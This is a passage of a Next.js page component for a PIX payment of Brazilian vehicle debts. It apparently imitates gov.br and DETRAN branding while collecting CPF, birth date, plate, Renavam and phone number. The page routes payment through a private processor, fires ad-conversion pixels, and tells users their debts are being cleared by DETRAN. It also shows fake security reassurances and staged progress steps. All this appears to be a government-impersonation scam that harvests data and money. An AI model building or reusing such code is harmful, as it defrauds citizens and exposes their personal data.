"use client"
import { useState, useEffect } from "react"
import type React from "react"

import { Header } from "@/components/header"
import { Footer } from "@/components/footer"
import { SecurityBadge } from "@/components/security-badge"
import { useRouter } from "next/navigation"
import { useTracking } from "@/hooks/use-tracking"
import { motion, AnimatePresence } from "framer-motion"

export default function PagamentoPIXPage() {
  const [paymentData, setPaymentData] = useState<any>(null)
  const [pixData, setPixData] = useState<any>(null)
  const [copied, setCopied] = useState(false)
  const [showQualification, setShowQualification] = useState(false)
  const [isGeneratingPix, setIsGeneratingPix] = useState(false)
  const [isConfirming, setIsConfirming] = useState(false)
  const [generatingStep, setGeneratingStep] = useState(0)
  const [paymentStatus, setPaymentStatus] = useState<"pending" | "paid" | "checking">("pending")
  const [transactionId, setTransactionId] = useState<string>("")

  const [telefone, setTelefone] = useState("")
  const [acceptedTerms, setAcceptedTerms] = useState(false)
  const [formErrors, setFormErrors] = useState<any>({})

  const router = useRouter()
  const { sessionId, trackingEnabled, trackEvent } = useTracking()

  const pixGenerationSteps = [
    { icon: "🔐", text: "Validando dados do pagamento..." },
    { icon: "🏦", text: "Conectando com instituição financeira..." },
    { icon: "💳", text: "Gerando código PIX seguro..." },
    { icon: "📱", text: "Preparando QR Code..." },
    { icon: "✅", text: "Finalizando..." },
  ]

  useEffect(() => {
    const savedPaymentData = localStorage.getItem("paymentData")
    if (!savedPaymentData) {
      router.push("/")
      return
    }

    const parsedData = JSON.parse(savedPaymentData)

    const thirtyMinutes = 30 * 60 * 1000
    if (Date.now() - parsedData.timestamp > thirtyMinutes) {
      localStorage.removeItem("paymentData")
      router.push("/")
      return
    }

    setPaymentData(parsedData)
    setShowQualification(true)
  }, [router])

  useEffect(() => {
    if (isGeneratingPix) {
      const interval = setInterval(() => {
        setGeneratingStep((prev) => {
          if (prev < pixGenerationSteps.length - 1) {
            return prev + 1
          }
          return prev
        })
      }, 800)
      return () => clearInterval(interval)
    }
  }, [isGeneratingPix, pixGenerationSteps.length])

  useEffect(() => {
    if (trackingEnabled && sessionId && paymentData) {
      trackEvent("pix_payment_page_view", { step: 4, page: "pagamento-pix" }, 4)
    }
  }, [trackingEnabled, sessionId, paymentData, trackEvent])

  const formatPhone = (value: string) => {
    const numbers = value.replace(/\D/g, "")
    if (numbers.length <= 10) {
      return numbers.replace(/(\d{2})(\d{4})(\d{0,4})/, "($1) $2-$3")
    }
    return numbers.replace(/(\d{2})(\d{5})(\d{0,4})/, "($1) $2-$3")
  }

  const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = formatPhone(e.target.value)
    setTelefone(formatted)
    if (formErrors.telefone) {
      setFormErrors({ ...formErrors, telefone: "" })
    }
  }

  const validateForm = () => {
    const errors: any = {}

    // Validate phone
    const phoneNumbers = telefone.replace(/\D/g, "")
    if (!telefone) {
      errors.telefone = "Telefone é obrigatório"
    } else if (phoneNumbers.length < 10) {
      errors.telefone = "Telefone inválido"
    }

    // Validate terms
    if (!acceptedTerms) {
      errors.terms = "Você deve aceitar os termos para continuar"
    }

    setFormErrors(errors)
    return Object.keys(errors).length === 0
  }

  const handleGeneratePix = async () => {
    if (!validateForm()) {
      return
    }

    if (trackingEnabled && sessionId) {
      trackEvent(
        "qualification_completed",
        {
          phone: telefone,
        },
        4,
      )
    }

    setIsGeneratingPix(true)
    setShowQualification(false) // Move this line up to show the generation animation immediately

    try {
      console.log("[v0] 🔵 Gerando PIX com AllowPay...")

      const response = await fetch("/api/payment/create-pix", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          amount: paymentData.valorFinal, // Use paymentData directly
          customerData: {
            nome: paymentData.userData.nome, // Use paymentData directly
            cpf: paymentData.userData.cpf.replace(/\D/g, ""),
            dataNascimento: paymentData.userData.dataNascimento,
            email: paymentData.userData.email || `${paymentData.userData.cpf.replace(/\D/g, "")}@temp.com`,
            telefone: telefone.replace(/\D/g, ""),
          },
          vehicleData: {
            placa: paymentData.userData.veiculo.placa,
            renavam: paymentData.userData.veiculo.renavam, // Added Renavam
            modelo: paymentData.userData.veiculo.modelo,
            marca: paymentData.userData.veiculo.marca,
            ano: paymentData.userData.veiculo.ano,
          },
        }),
      })

      const result = await response.json()
      console.log("[v0] ✅ Resposta da API:", result)

      if (result.success && result.transaction) {
        // Check for result.transaction specifically
        console.log("[v0] ✅ PIX gerado com sucesso, atualizando estado...")
        console.log("[v0] QR Code:", result.transaction.qr_code)
        console.log("[v0] QR Code Image:", result.transaction.qr_code_image)

        setGeneratingStep(pixGenerationSteps.length - 1)
        await new Promise((resolve) => setTimeout(resolve, 500))

        setShowQualification(false)
        setPixData(result.transaction)
        setIsGeneratingPix(false)
        setTransactionId(result.transaction.transaction_id)

        console.log("[v0] Estado atualizado - showQualification:", false, "pixData:", result.transaction)

        startPaymentStatusCheck(result.transaction.transaction_id)
      } else {
        throw new Error(result.error || "Erro ao gerar PIX")
      }
    } catch (error) {
      console.error("[v0] ❌ Erro ao gerar PIX:", error)
      setIsGeneratingPix(false)
      alert(`Erro ao gerar PIX: ${error.message}`)
    }
  }

  const handleCopyPIX = async () => {
    if (!pixData?.qr_code) return

    try {
      await navigator.clipboard.writeText(pixData.qr_code)
      setCopied(true)

      if (trackingEnabled && sessionId) {
        trackEvent("pix_key_copied", { step: 4 }, 4)
      }

      setTimeout(() => setCopied(false), 3000)
    } catch (err) {
      console.error("Erro ao copiar:", err)
    }
  }

  const handlePaymentConfirmation = async () => {
    if (trackingEnabled && sessionId) {
      trackEvent("payment_confirmation_click", { step: 4 }, 4)
    }

    setIsConfirming(true)
    // In a real scenario, you would likely call an API here to confirm payment
    // For now, we'll just simulate a delay and then potentially check status
    await new Promise((resolve) => setTimeout(resolve, 1500))

    // Optionally, you could trigger a status check or navigate
    // For this example, we assume the status check will eventually update paymentStatus to 'paid'
    // Or you might have a direct API call here to confirm the payment
  }

  const handleVoltar = () => {
    router.push("/debitos")
  }

  const formatCpf = (cpf: string) => {
    return cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4")
  }

  const formatDate = (dateString: string) => {
    if (!dateString) return "Data não disponível"

    if (dateString.includes("-")) {
      const [year, month, day] = dateString.split("-")
      if (year && month && day) {
        return `${day.padStart(2, "0")}/${month.padStart(2, "0")}/${year}`
      }
    } else if (dateString.includes("/")) {
      return dateString
    }

    return "Data não disponível"
  }

  const startPaymentStatusCheck = (txId: string) => {
    setPaymentStatus("checking")

    const checkInterval = setInterval(async () => {
      try {
        const response = await fetch(`/api/payment/check-status?transactionId=${txId}`)
        const result = await response.json()

        console.log("[v0] Payment status check:", result)

        if (result.success && result.isPaid) {
          setPaymentStatus("paid")
          clearInterval(checkInterval)

          // Show success message
          console.log("✅ [v0] Pagamento confirmado!")
        }
      } catch (error) {
        console.error("[v0] Erro ao verificar status:", error)
      }
    }, 5000) // Check every 5 seconds

    // Stop checking after 30 minutes
    setTimeout(
      () => {
        clearInterval(checkInterval)
        // Optionally, handle timeout if payment is not confirmed
        console.warn("[v0] Payment status check timed out.")
      },
      30 * 60 * 1000,
    )
  }

  useEffect(() => {
    if (paymentStatus === "paid") {
      console.log("✅ [v0] Pagamento confirmado!")

      if (typeof window !== "undefined") {
        try {
          // Fire Utmify purchase event
          // Ensure data and pixData are available before accessing their properties
          const valorFinal = paymentData?.valorFinal || 0
          const transactionId = pixData?.transaction_id
          const placa = paymentData?.userData?.veiculo?.placa

          if (typeof (window as any).utmify && typeof (window as any).utmify.event === "function") {
            ;(window as any).utmify.event("purchase", {
              value: valorFinal,
              currency: "BRL",
              transaction_id: transactionId,
              placa: placa,
            })
            console.log("✅ Utmify purchase event fired (payment confirmed)")
          }

          // Fire Facebook Pixel purchase event
          if (typeof (window as any).fbq === "function") {
            ;(window as any).fbq("track", "Purchase", {
              value: valorFinal,
              currency: "BRL",
              content_ids: [placa].filter(Boolean), // Filter out potential undefined/null values
              content_type: "product",
            })
            console.log("✅ Facebook purchase event fired (payment confirmed)")
          }
        } catch (pixelError) {
          console.error("❌ Error firing purchase events:", pixelError)
        }
      }

      // Track event - Make sure to have a valid sessionId before sending
      // Moved this to the main tracking hook or a dedicated function if needed
      // For now, keeping it here as per the update but consider refactoring
      if (trackingEnabled && sessionId) {
        trackEvent(
          "payment_successful",
          {
            transaction_id: pixData?.transaction_id,
            amount: paymentData?.valorFinal,
            placa: paymentData?.userData?.veiculo?.placa,
          },
          4,
        )
        console.log("✅ Tracking event 'payment_successful' fired.")
      } else {
        console.warn("[v0] Tracking not enabled or sessionId missing, skipping 'payment_successful' event.")
      }
    }
  }, [paymentStatus, paymentData, pixData, trackEvent, trackingEnabled, sessionId]) // Added dependencies

  if (paymentStatus === "paid") {
    return (
      <div className="min-h-screen bg-gradient-to-br from-[#f8f8f8] to-[#e8f4f8] flex flex-col">
        <Header />

        <div className="flex-1 flex items-center justify-center px-4 py-8">
          <motion.div
            initial={{ scale: 0.8, opacity: 0 }}
            animate={{ scale: 1, opacity: 1 }}
            transition={{ duration: 0.5 }}
            className="bg-white rounded-lg shadow-2xl border-2 border-green-500 max-w-2xl w-full overflow-hidden"
          >
            {/* Success Header */}
            <div className="bg-gradient-to-r from-green-500 to-green-600 p-8 text-center">
              <motion.div
                initial={{ scale: 0 }}
                animate={{ scale: 1, rotate: 360 }}
                transition={{ delay: 0.2, duration: 0.6, type: "spring" }}
                className="inline-block mb-4"
              >
                <div className="bg-white rounded-full p-4 shadow-lg">
                  <svg className="w-20 h-20 text-green-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={3} d="M5 13l4 4L19 7" />
                  </svg>
                </div>
              </motion.div>
              <h1 className="text-3xl md:text-4xl font-bold text-white mb-2">Pagamento Confirmado!</h1>
              <p className="text-green-50 text-lg">Transação aprovada com sucesso</p>
            </div>

            {/* Success Body */}
            <div className="p-8">
              {/* Gov.br Logo */}
              <div className="flex justify-center mb-6">
                <img src="/images/image.png" alt="Gov.br" className="h-12" />
              </div>

              {/* Processing Animation */}
              <div className="bg-blue-50 border-2 border-blue-200 rounded-lg p-6 mb-6">
                <div className="flex items-center gap-4 mb-4">
                  <div className="flex-shrink-0">
                    <motion.div
                      animate={{ rotate: 360 }}
                      transition={{ duration: 2, repeat: Number.POSITIVE_INFINITY, ease: "linear" }}
                    >
                      <svg className="w-12 h-12 text-[#1351B4]" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path
                          strokeLinecap="round"
                          strokeLinejoin="round"
                          strokeWidth={2}
                          d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15"
                        />
                      </svg>
                    </motion.div>
                  </div>
                  <div className="flex-1">
                    <h3 className="text-lg font-bold text-[#071D41] mb-1">Processando Baixa dos Débitos</h3>
                    <p className="text-sm text-[#555555]">
                      Seus débitos estão sendo registrados como pagos no sistema do DETRAN
                    </p>
                  </div>
                </div>

                {/* Progress Bar Animation */}
                <div className="bg-blue-100 rounded-full h-3 overflow-hidden">
                  <motion.div
                    initial={{ width: "0%" }}
                    animate={{ width: "100%" }}
                    transition={{ duration: 3, ease: "easeInOut" }}
                    className="bg-gradient-to-r from-[#1351B4] to-blue-500 h-full rounded-full"
                  />
                </div>
              </div>

              {/* Information Cards */}
              <div className="space-y-4 mb-6">
                <div className="flex items-start gap-3 p-4 bg-green-50 rounded-lg border border-green-200">
                  <svg
                    className="w-6 h-6 text-green-600 flex-shrink-0 mt-0.5"
                    fill="none"
                    stroke="currentColor"
                    viewBox="0 0 24 24"
                  >
                    <path
                      strokeLinecap="round"
                      strokeLinejoin="round"
                      strokeWidth={2}
                      d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"
                    />
                  </svg>
                  <div>
                    <h4 className="font-bold text-green-800 mb-1">Pagamento Aprovado</h4>
                    <p className="text-sm text-green-700">Seu pagamento foi confirmado e processado com sucesso</p>
                  </div>
                </div>

                <div className="flex items-start gap-3 p-4 bg-blue-50 rounded-lg border border-blue-200">
                  <svg
                    className="w-6 h-6 text-[#1351B4] flex-shrink-0 mt-0.5"
                    fill="none"
                    stroke="currentColor"
                    viewBox="0 0 24 24"
                  >
                    <path
                      strokeLinecap="round"
                      strokeLinejoin="round"
                      strokeWidth={2}
                      d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z"
                    />
                  </svg>
                  <div>
                    <h4 className="font-bold text-[#071D41] mb-1">Prazo de Regularização</h4>
                    <p className="text-sm text-[#555555]">Os débitos serão baixados no sistema em até 24 horas úteis</p>
                  </div>
                </div>

                <div className="flex items-start gap-3 p-4 bg-yellow-50 rounded-lg border border-yellow-200">
                  <svg
                    className="w-6 h-6 text-yellow-600 flex-shrink-0 mt-0.5"
                    fill="none"
                    stroke="currentColor"
                    viewBox="0 0 24 24"
                  >
                    <path
                      strokeLinecap="round"
                      strokeLinejoin="round"
                      strokeWidth={2}
                      d="M3 19v-8.93a2 2 0 01.89-1.664l7-4.666a2 2 0 012.22 0l7 4.666A2 2 0 0121 10.07V19M3 19a2 2 0 002 2h14a2 2 0 002-2M3 19l6.75-4.5M21 19l-6.75-4.5M3 10l6.75 4.5M21 10l-6.75 4.5m0 0l-1.14.76a2 2 0 01-2.22 0l-1.14-.76"
                    />
                  </svg>
                  <div>
                    <h4 className="font-bold text-yellow-800 mb-1">Comprovante Enviado</h4>
                    <p className="text-sm text-yellow-700">
                      O comprovante de pagamento será enviado para seu e-mail cadastrado
                    </p>
                  </div>
                </div>
              </div>

              {/* Transaction Details */}
              {pixData && (
                <div className="bg-gray-50 rounded-lg p-4 border border-gray-200 mb-6">
                  <h4 className="font-bold text-[#071D41] mb-3 text-sm">Detalhes da Transação</h4>
                  <div className="space-y-2 text-sm">
                    <div className="flex justify-between">
                      <span className="text-[#555555]">ID da Transação:</span>
                      <span className="font-mono text-xs text-[#071D41]">{pixData.transaction_id}</span>
                    </div>
                    <div className="flex justify-between">
                      <span className="text-[#555555]">Valor Pago:</span>
                      <span className="font-bold text-green-600">R$ {paymentData.valorFinal.toFixed(2)}</span>
                    </div>
                    <div className="flex justify-between">
                      <span className="text-[#555555]">Status:</span>
                      <span className="font-bold text-green-600">PAGO</span>
                    </div>
                  </div>
                </div>
              )}

              {/* Action Button */}
              <button
                onClick={() => {
                  window.location.href = "/"
                }}
                className="w-full bg-gradient-to-r from-[#1351B4] to-[#0D47A1] text-white font-bold py-4 px-6 rounded-lg hover:shadow-lg transition-all duration-200 flex items-center justify-center gap-2"
              >
                <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path
                    strokeLinecap="round"
                    strokeLinejoin="round"
                    strokeWidth={2}
                    d="M3 12l2-2m0 0l7-7 7 7M5 10v10a1 1 0 001 1h3m10-11l2 2m-2-2v10a1 1 0 01-1 1h-3m-6 0a1 1 0 001-1v-4a1 1 0 011-1h2a1 1 0 011 1v4a1 1 0 001 1m-6 0h6"
                  />
                </svg>
                Voltar para Página Inicial
              </button>
            </div>
          </motion.div>
        </div>

        <Footer />
      </div>
    )
  }

  if (!paymentData) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-[#f8f8f8]">
        <div className="text-center">
          <div className="animate-spin rounded-full h-16 w-16 border-b-4 border-[#1351B4] mx-auto mb-4"></div>
          <p className="text-[#555555]">Carregando...</p>
        </div>
      </div>
    )
  }

  if (showQualification && paymentData) {
    return (
      <div className="relative min-h-screen">
        {/* Blurred background content */}
        <div className={`min-h-screen ${isGeneratingPix || showQualification ? "blur-sm" : ""} pointer-events-none`}>
          <Header />
          <div className="flex-1 container mx-auto px-4 py-8 max-w-4xl">
            <div className="bg-white p-6 rounded-sm border border-gray-200 shadow-sm opacity-50">
              <h1 className="text-2xl font-bold text-[#071D41]">Pagamento PIX - Débitos Veiculares</h1>
            </div>
          </div>
          <Footer />
        </div>

        <div className="fixed inset-0 bg-black/40 backdrop-blur-sm flex items-center justify-center z-50 p-4 overflow-y-auto">
          <AnimatePresence mode="wait">
            {!isGeneratingPix ? (
              <motion.div
                key="qualification"
                initial={{ scale: 0.9, opacity: 0 }}
                animate={{ scale: 1, opacity: 1 }}
                exit={{ scale: 0.9, opacity: 0 }}
                className="bg-white p-8 rounded-lg shadow-2xl border-2 border-[#1351B4] max-w-2xl w-full my-8"
              >
                <div className="flex flex-col">
                  {/* Header */}
                  <div className="text-center mb-6">
                    <div className="bg-gradient-to-br from-[#1351B4] to-[#0D47A1] p-6 rounded-full shadow-lg mb-4 inline-block">
                      <svg className="w-16 h-16 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path
                          strokeLinecap="round"
                          strokeLinejoin="round"
                          strokeWidth={2}
                          d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"
                        />
                      </svg>
                    </div>
                    <h2 className="text-2xl font-bold text-[#071D41] mb-2">Confirmação de Dados</h2>
                    <p className="text-sm text-[#555555]">
                      Para sua segurança e para enviarmos o comprovante de pagamento
                    </p>
                  </div>

                  {/* User Info Summary */}
                  <div className="bg-[#F0F5FF] p-4 rounded-lg border border-[#1351B4] mb-6">
                    <div className="grid grid-cols-1 md:grid-cols-2 gap-3 text-sm">
                      <div>
                        <span className="text-[#555555]">Nome:</span>
                        <p className="font-bold text-[#071D41]">{paymentData.userData.nome}</p>
                      </div>
                      <div>
                        <span className="text-[#555555]">CPF:</span>
                        <p className="font-bold text-[#071D41]">{formatCpf(paymentData.userData.cpf)}</p>
                      </div>
                      <div>
                        <span className="text-[#555555]">Veículo:</span>
                        <p className="font-bold text-[#071D41]">{paymentData.userData.veiculo.placa}</p>
                      </div>
                      <div>
                        <span className="text-[#555555]">Valor:</span>
                        <p className="font-bold text-[#1351B4]">
                          {paymentData.valorFinal.toLocaleString("pt-BR", { style: "currency", currency: "BRL" })}
                        </p>
                      </div>
                    </div>
                  </div>

                  {/* Contact Form */}
                  <div className="space-y-4 mb-6">
                    {/* Phone Number - Required */}
                    <div>
                      <label className="block text-sm font-bold text-[#071D41] mb-2">
                        Telefone/Celular <span className="text-[#D4000F]">*</span>
                      </label>
                      <div className="relative">
                        <div className="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
                          <svg className="w-5 h-5 text-[#555555]" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path
                              strokeLinecap="round"
                              strokeLinejoin="round"
                              strokeWidth={2}
                              d="M3 5a2 2 0 012-2h3.28a1 1 0 01.948.684l1.498 4.493a1 1 0 01-.502 1.21l-2.257 1.13a11.042 11.042 0 005.516 5.516l1.13-2.257a1 1 0 011.21-.502l4.493 1.498a1 1 0 01.684.949V19a2 2 0 01-2 2h-1C9.716 21 3 14.284 3 6V5z"
                            />
                          </svg>
                        </div>
                        <input
                          type="tel"
                          value={telefone}
                          onChange={handlePhoneChange}
                          placeholder="(11) 99999-9999"
                          maxLength={15}
                          className={`w-full pl-10 pr-4 py-3 border-2 rounded-lg focus:outline-none focus:ring-2 focus:ring-[#1351B4] ${
                            formErrors.telefone ? "border-red-500" : "border-gray-300"
                          }`}
                        />
                      </div>
                      {formErrors.telefone && (
                        <p className="text-red-500 text-xs mt-1 flex items-center">
                          <svg className="w-4 h-4 mr-1" fill="currentColor" viewBox="0 0 20 20">
                            <path
                              fillRule="evenodd"
                              d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7 4a1 1 0 11-2 0 1 1 0 012 0zm-1-9a1 1 0 00-1 1v4a1 1 0 102 0V6a1 1 0 00-1-1z"
                              clipRule="evenodd"
                            />
                          </svg>
                          {formErrors.telefone}
                        </p>
                      )}
                      <p className="text-xs text-[#555555] mt-1">
                        Usaremos para enviar confirmação de pagamento via WhatsApp
                      </p>
                    </div>

                    {/* Terms and Conditions */}
                    <div className="bg-[#F8F8F8] p-4 rounded-lg border border-gray-300">
                      <label className="flex items-start cursor-pointer">
                        <input
                          type="checkbox"
                          checked={acceptedTerms}
                          onChange={(e) => {
                            setAcceptedTerms(e.target.checked)
                            if (formErrors.terms) {
                              setFormErrors({ ...formErrors, terms: "" })
                            }
                          }}
                          className="mt-1 w-5 h-5 text-[#1351B4] border-gray-300 rounded focus:ring-[#1351B4]"
                        />
                        <span className="ml-3 text-sm text-[#333333]">
                          Declaro que as informações fornecidas são verdadeiras e autorizo o processamento do pagamento
                          dos débitos veiculares no valor de{" "}
                          <strong>
                            {paymentData.valorFinal.toLocaleString("pt-BR", { style: "currency", currency: "BRL" })}
                          </strong>
                          .
                        </span>
                      </label>
                      {formErrors.terms && (
                        <p className="text-red-500 text-xs mt-2 flex items-center ml-8">
                          <svg className="w-4 h-4 mr-1" fill="currentColor" viewBox="0 0 20 20">
                            <path
                              fillRule="evenodd"
                              d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7 4a1 1 0 11-2 0 1 1 0 012 0zm-1-9a1 1 0 00-1 1v4a1 1 0 102 0V6a1 1 0 00-1-1z"
                              clipRule="evenodd"
                            />
                          </svg>
                          {formErrors.terms}
                        </p>
                      )}
                    </div>
                  </div>

                  {/* Security Badge */}
                  <div className="bg-[#E8F5E8] p-3 rounded-lg border border-[#4CAF50] mb-6">
                    <div className="flex items-center text-sm text-[#333333]">
                      <svg
                        className="w-5 h-5 text-[#4CAF50] mr-2 flex-shrink-0"
                        fill="none"
                        stroke="currentColor"
                        viewBox="0 0 24 24"
                      >
                        <path
                          strokeLinecap="round"
                          strokeLinejoin="round"
                          strokeWidth={2}
                          d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"
                        />
                      </svg>
                      <span>
                        <strong>Seus dados estão seguros.</strong> Utilizamos criptografia de ponta a ponta e não
                        compartilhamos suas informações.
                      </span>
                    </div>
                  </div>

                  {/* Action Buttons */}
                  <div className="space-y-3">
                    <button
                      onClick={handleGeneratePix}
                      className="w-full bg-[#1351B4] text-white py-4 px-6 rounded-lg hover:bg-[#0D47A1] transition-all transform hover:scale-105 font-bold text-lg shadow-lg flex items-center justify-center"
                    >
                      <svg className="w-6 h-6 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path
                          strokeLinecap="round"
                          strokeLinejoin="round"
                          strokeWidth={2}
                          d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"
                        />
                      </svg>
                      Confirmar e Gerar PIX
                    </button>

                    <button
                      onClick={() => router.push("/")}
                      className="w-full bg-gray-200 text-[#555555] py-3 px-6 rounded-lg hover:bg-gray-300 transition-colors font-medium"
                    >
                      Cancelar
                    </button>
                  </div>
                </div>
              </motion.div>
            ) : (
              <motion.div
                key="generating"
                initial={{ scale: 0.9, opacity: 0 }}
                animate={{ scale: 1, opacity: 1 }}
                className="bg-white p-8 rounded-lg shadow-2xl border-2 border-[#1351B4] max-w-md w-full"
              >
                <div className="text-center">
                  <motion.div
                    key={generatingStep}
                    initial={{ scale: 0, rotate: -180 }}
                    animate={{ scale: 1, rotate: 0 }}
                    transition={{ duration: 0.5 }}
                    className="inline-flex items-center justify-center w-24 h-24 rounded-full bg-gradient-to-br from-[#1351B4] to-[#0D47A1] mb-6 shadow-lg"
                  >
                    <span className="text-5xl">{pixGenerationSteps[generatingStep].icon}</span>
                  </motion.div>

                  <AnimatePresence mode="wait">
                    <motion.h2
                      key={generatingStep}
                      initial={{ opacity: 0, y: 20 }}
                      animate={{ opacity: 1, y: 0 }}
                      exit={{ opacity: 0, y: -20 }}
                      transition={{ duration: 0.3 }}
                      className="text-xl font-bold text-[#071D41] mb-6"
                    >
                      {pixGenerationSteps[generatingStep].text}
                    </motion.h2>
                  </AnimatePresence>

                  <div className="w-full bg-gray-200 rounded-full h-3 mb-6 overflow-hidden">
                    <motion.div
                      className="h-full bg-gradient-to-r from-[#1351B4] to-[#0D47A1] rounded-full"
                      initial={{ width: "0%" }}
                      animate={{ width: `${((generatingStep + 1) / pixGenerationSteps.length) * 100}%` }}
                      transition={{ duration: 0.5 }}
                    />
                  </div>

                  <div className="flex justify-center space-x-2 mb-4">
                    {[0, 1, 2].map((i) => (
                      <motion.div
                        key={i}
                        className="w-3 h-3 bg-[#1351B4] rounded-full"
                        animate={{
                          scale: [1, 1.5, 1],
                          opacity: [0.5, 1, 0.5],
                        }}
                        transition={{
                          duration: 1,
                          repeat: Number.POSITIVE_INFINITY,
                          delay: i * 0.2,
                        }}
                      />
                    ))}
                  </div>

                  <p className="text-sm text-[#555555] mb-4">Aguarde, estamos gerando seu código PIX...</p>

                  <div className="mt-6 flex items-center justify-center text-xs text-[#4CAF50]">
                    <svg className="w-4 h-4 mr-1" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path
                        strokeLinecap="round"
                        strokeLinejoin="round"
                        strokeWidth={2}
                        d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"
                      />
                    </svg>
                    Conexão segura e criptografada
                  </div>
                </div>
              </motion.div>
            )}
          </AnimatePresence>
        </div>
      </div>
    )
  }

  return (
    <main className="min-h-screen flex flex-col bg-[#f8f8f8]">
      <Header />
      <div className="flex-1 container mx-auto px-4 py-4 md:py-8 max-w-4xl">
        <div className="bg-white p-4 md:p-6 rounded-sm border border-gray-200 shadow-sm">
          <div className="border-b border-gray-200 pb-3 md:pb-4 mb-4 md:mb-6">
            <h1 className="text-xl md:text-2xl font-bold text-[#071D41]">Pagamento PIX - Débitos Veiculares</h1>
            <div className="hidden md:flex text-sm text-[#555555] mt-1 space-x-4">
              <div>Publicado em 17/12/2023 14h28</div>
              <div>Atualizado em 16/05/2025 14h20</div>
            </div>
          </div>

          {/* Indicador de progresso - Made more compact on mobile */}
          <div className="mb-4 md:mb-8">
            <div className="flex items-center justify-between">
              <div className="flex flex-col items-center">
                <div className="rounded-full h-8 w-8 md:h-10 md:w-10 flex items-center justify-center bg-[#1351B4] text-white text-sm">
                  ✓
                </div>
                <div className="mt-1 md:mt-2 text-xs md:text-sm text-[#071D41] font-medium">Identificação</div>
              </div>
              <div className="flex-1 mx-1 md:mx-2 h-1 bg-[#1351B4]"></div>
              <div className="flex flex-col items-center">
                <div className="rounded-full h-8 w-8 md:h-10 md:w-10 flex items-center justify-center bg-[#1351B4] text-white text-sm">
                  ✓
                </div>
                <div className="mt-1 md:mt-2 text-xs md:text-sm text-[#071D41] font-medium">Veículo</div>
              </div>
              <div className="flex-1 mx-1 md:mx-2 h-1 bg-[#1351B4]"></div>
              <div className="flex flex-col items-center">
                <div className="rounded-full h-8 w-8 md:h-10 md:w-10 flex items-center justify-center bg-[#1351B4] text-white text-sm">
                  ✓
                </div>
                <div className="mt-1 md:mt-2 text-xs md:text-sm text-[#071D41] font-medium">Débitos</div>
              </div>
              <div className="flex-1 mx-1 md:mx-2 h-1 bg-[#1351B4]"></div>
              <div className="flex flex-col items-center">
                <div className="rounded-full h-8 w-8 md:h-10 md:w-10 flex items-center justify-center bg-[#1351B4] text-white text-sm">
                  4
                </div>
                <div className="mt-1 md:mt-2 text-xs md:text-sm text-[#071D41] font-medium">Pagamento</div>
              </div>
            </div>
          </div>

          {/* Resumo do Pagamento - Made more compact to avoid scrolling */}
          <div className="bg-[#F0F5FF] p-3 md:p-6 mb-4 md:mb-6 border border-[#1351B4] rounded-sm">
            <h2 className="text-base md:text-lg font-bold text-[#071D41] mb-3 md:mb-4 flex items-center">
              <svg
                className="w-5 h-5 md:w-6 md:h-6 mr-2 text-[#4CAF50]"
                fill="none"
                stroke="currentColor"
                viewBox="0 0 24 24"
              >
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
              </svg>
              Resumo do Pagamento
            </h2>

            <div className="grid grid-cols-1 gap-3 md:gap-4 mb-3 md:mb-4">
              <div className="bg-white p-3 rounded border border-[#1351B4]">
                <div className="grid grid-cols-2 gap-2 text-xs md:text-sm">
                  <div>
                    <span className="text-[#555555]">Proprietário:</span>
                    <p className="font-bold text-[#071D41] truncate">{paymentData.userData.nome}</p>
                  </div>
                  <div>
                    <span className="text-[#555555]">CPF:</span>
                    <p className="font-bold text-[#071D41]">{formatCpf(paymentData.userData.cpf)}</p>
                  </div>
                  <div>
                    <span className="text-[#555555]">Placa:</span>
                    <p className="font-bold text-[#071D41]">{paymentData.userData.veiculo.placa}</p>
                  </div>
                  <div>
                    <span className="text-[#555555]">Modelo:</span>
                    <p className="font-bold text-[#071D41] truncate">{paymentData.userData.veiculo.modelo}</p>
                  </div>
                </div>
              </div>

              <div className="bg-white p-3 rounded border border-[#1351B4]">
                <div className="flex items-center justify-between text-xs md:text-sm mb-1">
                  <span className="text-[#555555]">Valor Original:</span>
                  <span className="line-through font-medium">
                    {paymentData.valorOriginal.toLocaleString("pt-BR", { style: "currency", currency: "BRL" })}
                  </span>
                </div>
                <div className="flex items-center justify-between text-xs md:text-sm mb-2">
                  <span className="text-[#555555]">Desconto ({paymentData.percentualDesconto}%):</span>
                  <span className="text-green-600 font-medium">
